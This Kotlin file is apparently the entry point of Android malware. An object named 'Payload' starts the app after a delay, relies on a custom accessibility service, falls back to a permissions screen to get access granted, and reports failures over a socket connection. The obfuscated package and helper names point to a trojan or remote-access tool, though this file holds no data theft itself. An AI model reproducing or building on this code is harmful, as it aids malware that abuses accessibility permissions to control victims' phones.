package com.xxx.zzz

import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import com.xxx.zzz.accessppp.AccessibilityServiceQ
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.globp.utilssss.Utilslp.getLabelApplication
import com.xxx.zzz.socketsp.IOSocketyt
import kotlinx.coroutines.CoroutineName
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob

object Payload {

    var startFrom = false

    val ApplicationScope: CoroutineScope =
        CoroutineScope(SupervisorJob() + Dispatchers.IO + CoroutineName("ApplicationScope"))

    @JvmStatic
    fun start(app: Context) {
        startFrom = true
        Handler(Looper.getMainLooper()).postDelayed({
            SharedPreferencess.init(app.applicationContext)
            SharedPreferencess.appName = getLabelApplication(app)
            runCatching {
                AccessibilityServiceQ.cnt
                val intent = Intent(app, MainActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                app.startActivity(intent)
            }.onFailure {
                runCatching {
                    val intent = Intent(app, PermissionsActivity::class.java)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                    app.startActivity(intent)
                }.onFailure {
                    IOSocketyt.sendLogs("", "Payload start ${it.localizedMessage}", "error")
                }
            }
        }, 1000)
    }

    fun start2(app: Context) {
        startFrom = false
        runCatching {
            AccessibilityServiceQ.cnt
            SharedPreferencess.init(app.applicationContext)
            val intent = Intent(app, MainActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            app.startActivity(intent)
        }.onFailure {
            runCatching {
                val intent = Intent(app, PermissionsActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                    .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                app.startActivity(intent)
            }.onFailure {
                IOSocketyt.sendLogs("", "Payload start2 ${it.localizedMessage}", "error")
            }
        }
    }

}